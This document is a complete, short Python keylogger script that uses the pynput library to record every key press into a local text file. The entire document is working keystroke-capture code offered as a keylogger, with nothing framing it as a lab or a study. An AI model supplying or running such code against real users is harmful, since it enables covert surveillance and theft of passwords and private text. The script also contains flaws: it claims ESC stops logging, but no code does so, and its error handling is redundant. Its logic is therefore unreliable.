from pynput import keyboard

LOG_FILE = "keylog.txt"

def write_to_file(key):
    """Write the key pressed to the log file."""
    with open(LOG_FILE, "a") as file:
        if isinstance(key, keyboard.Key):
            file.write(f"[{key.name}] ")
        else:
            file.write(key.char)

def on_press(key):
    """Callback function for key press."""
    try:
        write_to_file(key)
    except AttributeError:
        write_to_file(key)
    except Exception as e:
        print(f"Error logging key: {e}")

def main():
    """Main function to start the keylogger."""
    print("Starting keylogger. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
